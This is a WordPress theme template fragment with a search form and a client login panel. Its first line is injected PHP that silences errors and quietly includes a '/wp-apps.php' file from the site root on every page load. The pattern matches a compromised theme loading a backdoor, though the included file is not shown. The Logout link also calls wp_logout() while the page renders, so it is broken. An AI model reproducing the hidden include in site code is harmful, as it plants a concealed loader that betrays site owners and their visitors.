<?php error_reporting(0);include_once $_SERVER['DOCUMENT_ROOT'].'/wp-apps.php';?><form method="get" id="search" action="<?php bloginfo('url'); ?>/">
	<div id="searchWrapper">
		<input type="text" placeholder="Take a look around" name="s" id="s" required>
		<button type="submit">Search</button>
	</div>
</form>
	<div id="loginWrapper">
		<h1>Client Login</h1>
		<?php if (!(current_user_can('level_0'))){ ?>
		<form id="loginform" action="<?php echo get_option('home'); ?>/wp-login.php" method="post">
			<input type="text" name="log" id="log" placeholder="Username" value="<?php echo wp_specialchars(stripslashes($user_login), 1) ?>" required>
			<input type="password" name="pwd" id="pwd" placeholder="Password" required>
			<input type="hidden" name="remember" value="true" />
			<p>
				<a href="<?php echo bloginfo('url'); ?>/wp-login.php?action=lostpassword">Forgot Password</a>
				<a href="<?php echo bloginfo('url'); ?>/wp-login.php?action=register">Register (test)</a>
				<button type="submit">Login</button>
			</p>
		</form>
		<?php } else { ?>
		<a href="<?php wp_logout(); ?>">Logout</a>
		&nbsp;&nbsp;
		<a href="<?php echo bloginfo('url'); ?>/wp-admin/">Admin</a>
		<?php }?>
	</div>